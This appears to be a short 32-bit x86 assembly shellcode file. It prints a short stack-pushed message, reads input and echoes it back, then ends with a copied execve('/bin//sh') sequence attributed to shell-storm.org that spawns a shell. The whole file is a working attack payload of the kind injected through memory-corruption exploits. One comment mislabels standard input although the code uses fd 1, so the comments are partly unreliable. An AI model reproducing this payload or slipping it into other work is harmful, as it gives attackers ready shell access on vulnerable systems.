BITS 32
	push 0x0a		; "\n"
	push 0x216d7476		; "!mtv"
	push 0x20656920		; " ei "
	push 0x656c656c		; "elel"
	push 0x656e616d		; "enam"
	mov edx, 17		; Message length is 17 bytes.
	mov ecx, esp		; Stack points to message.
	mov ebx, 1		; Print to standard output (fd = 1).
	mov eax, 4		; __NR_write
	int 0x80
	mov edx, 17		; Message length is 17 bytes.
	mov ecx, esp		; Stack points to message.
	mov ebx, 1		; Print to standard input (fd = 0).
	mov eax, 3		; __NR_read
	int 0x80
	mov edx, eax		; Message length is however many bytes were
				; returned by the previous read.
	mov ecx, esp		; Stack points to message.
	mov ebx, 1		; Print to standard output (fd = 1).
	mov eax, 4		; __NR_write
	int 0x80
	; xor ebx, ebx		; exit(0)
	; mov eax, 1		; __NR_exit
	; int 0x80
	xor edx, edx    ; http://shell-storm.org/shellcode/files/shellcode-251.php
	push 0xb
	pop eax
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push edx
	push ebx
	mov ecx, esp
	int 0x80
